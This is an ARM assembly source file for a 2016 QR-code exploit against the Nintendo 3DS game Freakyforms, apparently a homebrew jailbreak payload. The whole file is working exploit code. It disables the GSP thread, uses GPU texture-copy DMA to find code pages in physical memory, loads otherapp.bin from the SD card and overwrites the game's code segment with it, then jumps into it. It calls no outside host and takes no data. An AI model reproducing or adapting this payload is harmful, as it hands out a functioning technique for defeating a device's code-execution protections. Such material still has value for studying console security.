/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "constants.h"

.text
_start:
/* Initialize stack. */
    mov  sp, #0x10000000
    sub  sp, #0x2C + 4*12
    bl   framebuffer_reset
/* Red screen. */
    ldr  r0, =0xFF0000FF
    bl   framebuffer_fill
/* Tell GSP thread to fuck off. */
    ldr  r0, =GSP_THREAD_OBJ_PTR
    mov  r1, #1
    strb r1, [r0, #0x77]
    ldr  r0, [r0, #0x2C]
    svc  0x18
/* Scan where the code-pages reside in physical memory. */
    add  r0, sp, #0x2C
    bl   scan_code_pages
/* Open otherapp.bin on sdcard root. */
    add  r0, sp, #0xC     // file_handle_out
    adr  r1, otherapp_str // path
    mov  r2, #1           // flags=FILE_READ
    ldr  r3, =FS_OPEN_FILE
    blx  r3
/* Read it into linear memory. */
    ldr  r1, [sp, #0xC] // file_handle
    add  r0, sp, #8     // bytes_read_out
    mov  r2, #0         // offset_lo
    mov  r3, #0         // offset_hi
    ldr  r4, =OTHERAPP_ADDR
    str  r4, [sp]       // dst
    ldr  r4, =OTHERAPP_SIZE
    str  r4, [sp, #4]   // size
    ldr  r4, =FS_READ_FILE
    blx  r4
/* Gspwn it to code segment. */
    mov  r4, #0
gspwn_loop:
    add  r0, sp, r4, lsl #2
    ldr  r0, [r0, #0x2C]    // dst
    ldr  r1, =OTHERAPP_ADDR // src
    add  r1, r1, r4, lsl #12
    ldr  r2, =0x1000        // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep
    add  r4, #1
    cmp  r4, #12
    bne  gspwn_loop
/* Green screen. */
    ldr  r0, =0x00FF00FF
    bl   framebuffer_fill

/* Grab GSP handle for next payload. */
    ldr  r0, =GSP_GET_HANDLE
    blx  r0
    mov  r3, r0
/* Set up param-blk for otherapp payload. */
    ldr  r0, =PARAMBLK_ADDR
    ldr  r1, =GSP_GX_CMD4
    str  r1, [r0, #0x1C] // gx_cmd4
    ldr  r1, =GSP_FLUSH_DATA_CACHE
    str  r1, [r0, #0x20] // flushdcache
    add  r2, r0, #0x48
    mov  r1, #0x8D       // flags
    str  r1, [r2]
    add  r2, r0, #0x58   // gsp_handle
    str  r3, [r2]
/* smea's magic does the rest. */
    ldr  r0, =PARAMBLK_ADDR  // param_blk
    ldr  r1, =0x10000000 - 4 // stack_ptr
    ldr  r2, =OTHERAPP_CODE_VA
    blx  r2
forever:
    b    forever

.pool
otherapp_str:
    .string16 "sdmc:/otherapp.bin\0"

/* Scan heap until we find where the code ended up in physical memory. */
scan_code_pages:
    push {r4, r5, r6, r7, r8, lr}
    mov  r8, r0
    mov  r4, #0
    ldr  r5, =CODE_SCAN_START // src
    ldr  r6, =CODE_SCAN_BUF   // dst
__scan_loop:
    mov  r0, r6      // dst
    mov  r1, r5      // src
    ldr  r2, =0x1000 // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep

/* Try to see if first 0x100 bytes of the page matches any of the code pages
   that we're interested in. */
    mov  r7, #0
__scan_inner_loop:
    ldr  r0, =OTHERAPP_CODE_VA
    add  r0, r0, r7, lsl #12
    mov  r1, r6
    mov  r2, #0x100
    bl   memcmp32
    cmp  r0, #0
    bne  __scan_inner_loop_next
/* We found the page! Set bit and store the addr. */
    add  r0, r8, r7, lsl #2
    str  r5, [r0]
    mov  r0, #1
    orr  r4, r4, r0, lsl r7
__scan_inner_loop_next:
    add  r7, #1
    cmp  r7, #12
    bne  __scan_inner_loop

    add  r5, #0x1000 // src += 0x1000
    add  r6, #0x100  // dst += 0x100

/* Have we found all 12 pages? */
    ldr  r0, =0xFFF
    cmp  r4, r0
    bne  __scan_loop

    pop  {r4, r5, r6, r7, r8, pc}
.pool

memcpy32:
    cmp  r2, #0
    bxeq lr
    ldr  r3, [r1], #4
    str  r3, [r0], #4
    sub  r2, #4
    b    memcpy32

memcmp32:
    mov  r3, r0
    mov  r0, #0
__memcmp32_loop:
    cmp  r2, #0
    bxeq lr
    push {r4, r5}
    ldr  r4, [r1], #4
    ldr  r5, [r3], #4
    subs r0, r4, r5
    pop  {r4, r5}
    bxne lr
    sub  r2, #4
    b    __memcmp32_loop

/* small_sleep: Sleep for a while. */
small_sleep:
    mov  r0, #0x100000
    mov  r1, #0
    svc  0x0A // svcSleepThread
    bx   lr

/* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
gsp_gxcmd_texturecopy:
    push {r4, r5, lr}
    sub  sp, #0x20
    mov  r4, #0

    mov  r5, #4          // cmd_type=TEXTURE_COPY
    str  r5, [sp]
    str  r1, [sp, #4]    // src_ptr=r1
    str  r0, [sp, #8]    // dst_ptr=r0
    str  r2, [sp, #0xC]  // size=r2
    str  r4, [sp, #0x10] // in_dimensions=0
    str  r4, [sp, #0x14] // out_dimensions=0
    mov  r5, #8
    str  r5, [sp, #0x18] // flags=8
    str  r4, [sp, #0x1C] // unused=0

    mov  r0, sp
    bl   gsp_execute_gpu_cmd
    add  sp, #0x20
    pop  {r4, r5, pc}
.pool

gsp_execute_gpu_cmd:
    push {lr}
    mov  r1, r0
    ldr  r4, =GSP_GET_INTERRUPTRECEIVER
    blx  r4
    add  r0, #0x58
    ldr  r4, =GSP_ENQUEUE_CMD
    blx  r4
    pop  {pc}
.pool

/* framebuffer_reset: Setup framebuffer to point to FRAMEBUF_ADDR. */
framebuffer_reset:
    push {lr}
    ldr  r0, =0x00400468
    bl   set_fb_register
    ldr  r0, =0x0040046C
    bl   set_fb_register
    ldr  r0, =0x00400494
    bl   set_fb_register
    ldr  r0, =0x00400498
    bl   set_fb_register

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x00400470
    adr  r1, __fb_format
    mov  r2, #4
    blx  r3

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x0040045C
    adr  r1, __fb_size
    mov  r2, #4
    blx  r3

    pop  {pc}
__fb_format:
    .word (0 | (1<<6))
__fb_size:
    .word (240<<16) | (400)

set_fb_register:
    ldr  r3, =GSP_WRITE_HW_REGS
    adr  r1, __fb_physaddr
    mov  r2, #4
    bx   r3
__fb_physaddr:
    .word GPU_TO_PA_ADDR(FRAMEBUF_ADDR)

/* framebuffer_fill: Fill framebuffer with color in r0. */
framebuffer_fill:
    ldr   r1, =FRAMEBUF_ADDR
    ldr   r2, =FRAMEBUF_SIZE
    add   r2, r1
__fill_loop:
    str   r0, [r1]
    add   r1, #4
    cmp   r1, r2
    bne   __fill_loop
    ldr   r4, =GSP_FLUSH_DATA_CACHE
    ldr   r0, =FRAMEBUF_ADDR
    ldr   r1, =FRAMEBUF_SIZE
    bx    r4

.pool

/* Force assembler error if payload becomes greater than 0x800. */
.org 0x800, 0x45
